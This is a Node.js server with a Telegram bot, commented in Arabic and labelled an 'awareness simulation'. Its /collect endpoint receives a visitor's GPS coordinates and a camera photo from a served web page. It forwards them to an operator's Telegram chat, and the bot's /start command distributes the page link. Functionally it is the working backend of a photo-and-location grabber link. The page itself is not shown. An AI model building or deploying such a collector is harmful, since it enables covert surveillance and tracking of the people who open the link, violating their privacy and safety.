require('dotenv').config();

const express = require('express');
const path = require('path');
const { Telegraf } = require('telegraf');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('❌ يجب ضبط BOT_TOKEN و CHAT_ID في متغيرات البيئة');
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const app = express();

app.use(express.json({ limit: '15mb' }));
app.use(express.static(path.join(__dirname, 'public')));

/*
 * استقبال البيانات من الصفحة
 *
 * الصورة والموقع مستقلان:
 * - يمكن استقبال الصورة فقط
 * - يمكن استقبال الموقع فقط
 * - يمكن استقبال الاثنين
 */
app.post('/collect', async (req, res) => {
  try {
    const { location, photo } = req.body;

    const hasLocation =
      location &&
      typeof location.lat === 'number' &&
      typeof location.lon === 'number';

    const hasPhoto =
      typeof photo === 'string' &&
      photo.startsWith('data:image/');

    // لا توجد أي بيانات
    if (!hasLocation && !hasPhoto) {
      return res.status(400).json({
        ok: false,
        error: 'لا توجد بيانات صالحة'
      });
    }

    /*
     * إرسال الموقع إذا وصل.
     * لا ننتظر الصورة.
     */
    if (hasLocation) {
      try {
        await bot.telegram.sendLocation(
          CHAT_ID,
          location.lat,
          location.lon
        );

        console.log(
          `📍 تم إرسال الموقع: ${location.lat}, ${location.lon}`
        );
      } catch (err) {
        console.error('❌ خطأ في إرسال الموقع:', err.message);
      }
    }

    /*
     * إرسال الصورة إذا وصلت.
     * لا ننتظر الموقع.
     */
    if (hasPhoto) {
      try {
        const base64Data = photo.replace(
          /^data:image\/[^;]+;base64,/,
          ''
        );

        const buffer = Buffer.from(base64Data, 'base64');

        let caption = '📷 صورة من المحاكاة التوعوية';

        if (hasLocation) {
          caption +=
            `\n📍 ${location.lat.toFixed(5)}, ${location.lon.toFixed(5)}` +
            `\n🎯 دقة الموقع: ${Math.round(location.acc || 0)} م`;
        } else {
          caption += '\n📍 الموقع غير متاح أو تم رفض الإذن';
        }

        await bot.telegram.sendPhoto(
          CHAT_ID,
          { source: buffer },
          { caption }
        );

        console.log('📷 تم إرسال الصورة');
      } catch (err) {
        console.error('❌ خطأ في إرسال الصورة:', err.message);
      }
    }

    res.json({
      ok: true,
      hasPhoto,
      hasLocation
    });

  } catch (err) {
    console.error('❌ خطأ في /collect:', err);

    res.status(500).json({
      ok: false,
      error: err.message
    });
  }
});


/*
 * أمر /start
 */
bot.start((ctx) => {
  const url =
    process.env.PUBLIC_URL ||
    'https://your-app.onrender.com';

  ctx.reply(
    `👋 أهلاً!\n\n` +
    `هذه صفحة المحاكاة التوعوية.\n\n` +
    `🔗 ${url}/index.html`
  );
});


/*
 * تشغيل البوت والسيرفر
 */
bot.launch();

console.log('🤖 البوت يعمل...');

app.listen(PORT, () => {
  console.log(`🌐 السيرفر يعمل على المنفذ ${PORT}`);
});


/*
 * إيقاف نظيف
 */
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));